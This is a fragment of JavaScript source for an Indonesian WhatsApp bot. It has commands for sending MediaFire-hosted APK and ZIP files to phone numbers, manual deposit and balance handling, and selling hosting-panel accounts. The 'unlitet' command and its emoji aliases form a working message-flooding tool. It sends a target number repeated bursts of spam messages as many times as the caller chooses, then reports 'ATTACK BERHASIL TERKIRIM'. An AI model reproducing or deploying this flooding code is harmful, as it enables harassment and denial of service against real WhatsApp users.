if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/cd541f9b7u12cpf/THEMA+MERAH.apk/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendwa3': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/2je9qiwrzckvws5/TEMA+UNGGU.apk/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendwa4': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/5qfss7f1ah3up0p/FMWhatsApp_Imnune.apk/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc1': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/cku38uri67q16ov/Free1.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc2': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/zm56k87hqst54cq/Free2.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc3': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/f4a7sxq6lmdhpwd/Free3.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc4': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/n0d2o3u98q0anw9/Free4.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc5': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/g01n99speif85bj/Free5.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc6': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/m4tgdftzm9t2nji/Free6.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc7': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/x6th6u4nh8ad8wv/Scv7.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc8': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/k13jxfbeimrrtjn/Sc+Gratis+By+Rafathar.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc9': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/b4qcuinhpkmg5n8/Sc+Gratis.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc10': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/0xy68my2nju4rx0/Pw+Cari+Sendiri,+Gush+Chat+Gw.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
                case 'sendsc11': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!args[0]) return reply(`Nomor Nya Mana?`)
piw = text.split("|")[0]+'@s.whatsapp.net'
reply(`*_Sukses Terkirim Tuan..._*`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/lv7zxaijoonpexd/Sc+Hw21_No+Enc.zip/file')
Biiofc.sendMessage(piw, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, { quoted : fkontak}).catch ((err) => reply('*Failed to download File*'))
}
break
   case 'bukti':{
           let jumlah = args[0]
           if (!jumlah) return reply('Jumblah nya?')
reply('OKE KAK DEPOSIT SEDANG DI PROSES MOHON MENUNGGU SAMPAI OWNER MENGKONFIRMASI DEPOSIT TERSEBUT')
Biiofc.sendMessage(`${owner}@s.whatsapp.net`, { text: `*ADA YANG DEPOSIT NIH*\n*SEJUMLAH ${jumlah} DARI @${sender.split('@')[0]}*\n*INGIN ACC DEPOSIT? KETIK*\n*${prefix}acc MAU NOLAK? BIARIN AJA*`, mentions: [sender]}, { quoted: hw })
        }
        break
           case 'reportbug':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
           let ripotbug = args[0]
           if (!ripotbug) return reply('Teksnya?')
reply('Oke Kak Reportmu Sudah Terkirim Ke Owner')
Biiofc.sendMessage('6288286517973@s.whatsapp.net', { text: `*===[ REPORT ]===*\n*TEXT : ${jumlah} DARI : @${sender.split('@')[0]}*\n*Ketik ${prefix}accreport Jika Ingin Menerima Laporan*\n*${prefix}acc Jika Ingin Menolak Report Biarin Ajah 🗿*`, mentions: [sender]}, { quoted: hw })
        }
        break
        case 'accreport': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
let messageText = `_Terima Kasih Atas Laporan Anda Dan Laporan Anda Diterima Tunggu 1 - 2 Hari Agar Owner Bisa Memperbaikinya`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc berhasil!');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break
                case 'saldo':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
reply(`*━━ CHECK YOUR INFO ━━*

 _• *Name:* ${pushname}_
 _• *Nomer:* ${sender.split('@')[0]}_
 _• *Saldo:* Rp${toRupiah(cekSaldo(sender, db_saldo))}_

*Note :*
_Saldo hanya bisa untuk beli di bot_
_Tidak bisa ditarik atau transfer_!`)
}
break
          case 'qris': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/355571d399e83f88c8cd2.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'orkut': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/355571d399e83f88c8cd2.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
        case 'gopay': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/355571d399e83f88c8cd2.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case 'dana': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/355571d399e83f88c8cd2.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
          case 'bri': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
Biiofc.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/16455c651bb586fc20443.jpg' }, caption: `JAN LUPA SS BUKTI DAN NOMINALNYA YA 
example : .bukti 5000` }, { quoted: hw })
}
        break
case "deposit":
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
        depo = `PILIH PAYMENT DEPOSIT DIBAWAH DAN SEBUTKAN NOMINALNYA
contoh : ${prefix}dana 5000

${prefix}dana✅
${prefix}qris✅
${prefix}bri✅
${prefix}orkut✅
${prefix}gopay✅`
        Biiofc.sendMessage(from, {text : depo}, {quoted : hw}) 
        break      
    case "buyvps": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textvps = `*Hi @${sender.split("@")[0]} 👋*
*── 「 DE4YOU Offcial 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST VPS DIGITALOCEAN ｣*

⭔●${prefix}buypaketvps1g1c
⭔●${prefix}buypaketvps2g1c
⭔●${prefix}buypaketvps2g2c
⭔●${prefix}buypaketvps4g2c
⭔●${prefix}buypaketvps8g4c


_*NOTE:*_ pilih salah satu yang saldo kamu cukup
Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(m.chat, {
text: textvps,
contextInfo: { mentionedJid: [sender, owned],
externalAdReply: {
showAdAttribution: true,
title: namaCreator,
body: 'bodynya',
thumbnailUrl: 'https://telegra.ph/file/04e2ba84854ab541a653f.jpg',
sourceUrl: "https://chat.whatsapp.com/EvwRjBk5J3c5aETCiasuLF",
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: fkontak})
}
break
    case "buysrv": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
const owned = `0@s.whatsapp.net`
const version = require("baileys/package.json").version
const textsrv = `*Hi @${sender.split("@")[0]} 👋*
*── 「 DE4YOU Offcial 」 ──*				   	
• *Saldo:* _Rp${toRupiah(cekSaldo(sender, db_saldo))}_
• *Name:* ${pushname}
• *Id*: _${sender.replace("@s.whatsapp.net", "")}_
  
   *｢ LIST SERVER ｣*
⭔●${prefix}srvpaket1 _*Ram 1GB/1GB*_
⭔●${prefix}srvpaket2 _*Ram 2GB/2GB*_
⭔●${prefix}srvpaket3 _*Ram 3GB/3GB*_
⭔●${prefix}srvpaket4 _*Ram 4GB/4GB*_
⭔●${prefix}srvpaket5 _*Ram 5GB/5GB*_
⭔●${prefix}srvpaket6 _*Ram UNLI/UNLI*_
⭔●${prefix}srvpaket7 _*Ram 6GB/6GB*_
⭔●${prefix}srvpaket8 _*Ram 7GB/7GB*_
⭔●${prefix}srvpaket9 _*Ram 8GB/8GB*_
⭔●${prefix}srvpaket10 _*Ram 9GB/9GB*_

_*NOTE:*_ pilih salah satu yang saldo kamu cukup

Powered By *@${owned.split("@")[0]}*
▬▭▬▭▬▭▬▭▬▭▬▭▬`
Biiofc.sendMessage(from, { text: textsrv, contextInfo: { mentionedJid: [sender, owned], forwardingScore: 9999, isForwarded: true }}, { quoted: m })
}
break
case 'acc': case 'addsaldo':{
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
if (!q.split(",")[0]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
if (!q.split(",")[1]) return reply(`Ex : ${prefix+command} nomor,jumlah\n\nContoh :\n${prefix+command} 628xxx,20000`)
addSaldo(q.split(",")[0]+"@s.whatsapp.net", Number(q.split(",")[1]), db_saldo)
reply(`「 *SALDO USER* 」
⭔ID: @${sender.split("@")[0]}
⭔Nomer: @${q.split(",")[0]}
⭔Tanggal: ${tanggal}
⭔Saldo: Rp${toRupiah(cekSaldo(q.split(",")[0]+"@s.whatsapp.net", db_saldo))}, `)
                }
        case 'kirim': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply('Maaf, command ini hanya untuk pemilik.')
 let messageText = `DONE KAK DEPOSIT SUDAH BERHASIL SEJUMLAH  ${q.split(",")[1]} TELAH DITAMBAHKAN KE SALDO ANDA CEK SALDO KETIK .SALDO TERIMAKASIH`
  let targetNumber = `${q.split(",")[0]}@s.whatsapp.net`;

  Biiofc.sendMessage(targetNumber, {
    text: `*${messageText}*`,
    mentions: [sender]
  }, {
    quoted: hw
  }).then(() => {
    m.reply('Acc Berhasil Tuan✅');
  }).catch(() => {
    m.reply('Gagal mengirim pesan!');
  });
}
break;
        //Diatas case kirim jangan dihapus ntr error
        case 'unlitet' : case '🌷' : case '🐲': case '🐉': case '🌵': case '🎄': case '🌲': case '🌳': case '🌱': case '😎': case '😈': case '🗿':  {
   if (!isPremium && !isOwner) return reply(mess.only.premium)
if (!text) return reply(`Command Salah Silahkan Gunakan Command ${prefix+command} nomor|jumlah`)
prrkek = text.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await Biiofc.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
await reply(mess.wait)
global.jumlah = text.split("|")[1]
for (let i = 0; i < jumlah; i++) {
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: 'DONE!!!!'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000) 
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████▒▒▒▒▒▒▒▒》40%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '████████████▒▒》80%'}, {quoted:lep})
await sleep(2000)
Biiofc.sendMessage(prrkek, {text: '██████████████》100%'}, {quoted:lep})
await sleep(2000)
}
Biiofc.sendMessage(from, { text: `*ATTACK BERHASIL TERKIRIM*
*TARGET :* @${prrkek.split("@")[0]}
*JUMLAH SPAM :* ${global.jumlah}×

*_NOTE :_*
*HARAP JEDA 1 MENIT !!*
*GAK JEDA DELETE AKSES !!*`,
contextInfo: { 
"mentionedJid": [prrkek],
"externalAdReply": { 
"showAdAttribution": true, 
"title": "Ytb de4youjembot-17`", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "https://youtube.com/@de4you986", 
"sourceUrl": "https://youtube.com/@de4you986" }}}, { quoted: m })
}
break
        //bagian panel
        case 'buyakn':{
if (cekSaldo(sender,db_saldo) < 2000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
if (!q.split(',')[0]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@de4you.com,contoh`)
if (!q.split(',')[1]) return reply(`Ex : ${prefix+command} email,username\n\nContoh :\n${prefix+command} contoh@de4you.com,contoh`)
let d = (await Biiofc.onWhatsApp(sender.split('@')[0]))[0] || {}
let psswd = d.exists ? require("crypto").randomBytes(5).toString('hex') : username+'7739'
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
},
"body": JSON.stringify({
"email": q.split(',')[0],
"username": q.split(',')[1],
"first_name": q.split(',')[1],
"last_name": "Memb",
"language": "en",
"password": psswd
})
})
let res = await f.json();
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2));
Biiofc.sendMessage(from, { text: `*SUCCESSFULLY BUY USER*\n\n*TYPE:* user\n\n*ID:* ${res.attributes.id}\n*UUID:* ${res.attributes.uuid}\n*USERNAME:* ${res.attributes.username}\n*EMAIL:* ${res.attributes.email}\n*FIRST NAME/LAST NAME:* ${res.attributes.first_name}/${res.attributes.last_name}\n*CREATED AT:* ${res.attributes.created_at}\n\n*Password telah dikirim ke @${sender.split('@')[0]}*`, mentions: [sender]}, { quoted: m })
    Biiofc.sendMessage(sender, { text: `*BERIKUT DATA AKUN ANDA*\n\n*EMAIL:* ${res.attributes.email}\n*USERNAME:* ${res.attributes.username}\n*PASSWORD:* ${psswd}\n*LOGIN:* ${domain}\n\n*NOTE*\n_*BOT* atau *CLIENT De4you Offcial* tidak akan mengirim kedua kali,_\n_Jadi simpan baik baik atau di ingat._\n\nUntuk Membeli server ketik ${prefix}buysrv ya\n\n#TERIMAKASIH`,})
}    
        
        break
        case "panel": {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
